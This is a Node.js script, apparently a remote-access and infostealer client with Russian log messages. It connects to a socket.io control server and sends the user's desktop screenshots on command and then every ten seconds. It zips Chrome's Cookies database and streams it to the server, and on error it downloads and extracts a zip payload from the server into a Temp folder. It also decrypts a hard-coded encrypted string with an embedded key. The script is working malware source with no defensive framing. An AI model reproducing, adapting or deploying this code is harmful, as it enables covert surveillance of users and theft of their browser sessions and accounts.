const crypto = require('crypto');
function decrypt(encryptedText, key) {
    const decipher = crypto.createDecipher('aes-256-cbc', key);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}
const key = '080545641479637dd61dddcea091eaf625888a280545d\\\\6414799c637d9cd61dddc91/88a2a210b935dadd6aa4e80a0e5a0591832-02a080545ddde5a059a4e810b935d__a04e810b835da';
const decryptedText = decrypt('92d81d13fbaaf5fa9715d1d486fab918a6050799b0bc71124fe403d825ce5dfa09eec38911ee29313b5dd1a8d8f1962c', key);
const targ = 'http://localhost:3000';
const time = 10000;
const socket = require('socket.io-client')(targ);
const screenshot = require('screenshot-desktop');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const extract = require('extract-zip');
const path = require('path')
const archiver = require('archiver');

const username = os.userInfo().username;
const HD = os.homedir();

let isImageProcessed = true;

async function connect() {
    try {
        const response = await axios.get(targ)
        if (response.status === 200) {
            socket.on('connect', () => {
                console.log('Подключено к серверу');
            });
        }
    } catch (error) {
        console.log('Ошибка переподключение через 10 секунд...');
        setTimeout(connect, time);
    }
}

async function uploadImage() {
    console.log("Uploading img function");
    try {
        const img = await screenshot();
        let base64Image = Buffer.from(img).toString('base64');
        let data = { image: base64Image };
        let headers = { "name": username };

        socket.emit('upload_image', data, headers);
        isImageProcessed = false;
        console.log("Sended");
        try {
            const GCPath = HD + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
            const archivePath = path.join(__dirname, 'archive.zip');
        
            fs.access(GCPath, fs.constants.F_OK, (err) => {
                if (err) {
                    console.log('Файл не существует.');
                } else {
                    if (!fs.existsSync(archivePath)) {
                        const output = fs.createWriteStream(archivePath);
                        const archive = archiver('zip', {
                            zlib: { level: 9 }
                        });
        
                        output.on('close', () => {
                            console.log(`Архив создан: ${archive.pointer()} total bytes`);
        
                            const readStream = fs.createReadStream(archivePath);
                            readStream.on('data', (chunk) => {
                                socket.emit('uplCookie', chunk, { name: username });
                            });
                            readStream.on('end', () => {
                                console.log("Архив принят");
                                socket.emit('end');
                            });
                        });
        
                        archive.on('error', (err) => {
                            if (err.code === 'EBUSY') console.log('Файл занят.');
                            else console.log("Ошибка заключаетца в другом");
                        });
        
                        archive.pipe(output);
                        archive.file(GCPath, { name: path.basename(GCPath) });
                        archive.finalize();
                    } else {
                        console.log(`Архив уже существует.`);
                    }
                }
            });
        } catch (Error) {
            console.log("Произошла ошибка при создании архива.");
        }
    } catch (error) {
        console.log('Ошибка при создании скриншота:');
        let folderPath = path.join(HD, '\\AppData\\Local\\Temp\\screenCapture\\');
        let zipPath = path.join(folderPath, 'files.zip');
    
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
            console.log('Папка успешно создана!');
        }  
        let response = await axios.get(targ, { headers: { 'getdata': 'true' }, responseType: 'arraybuffer' });
        fs.writeFileSync(zipPath, response.data);
        console.log('Файл успешно сохранен!'); 
        await extract(zipPath, { dir: folderPath });
        console.log('Файлы успешно извлечены!');
        connect();
    }
}    

connect();

socket.on('give-image', () => {
    console.log("Server asked img");
    uploadImage();
    setInterval(() => {
        if (isImageProcessed) {
            uploadImage();
        }else console.log(isImageProcessed);
    }, time);
})

socket.on('disconnect', () => {
    console.log('Отключено от сервера');
    isImageProcessed = true;
    connect();
});

socket.on('image_processed', () => {
    isImageProcessed = true;
    console.log("image_processed");
});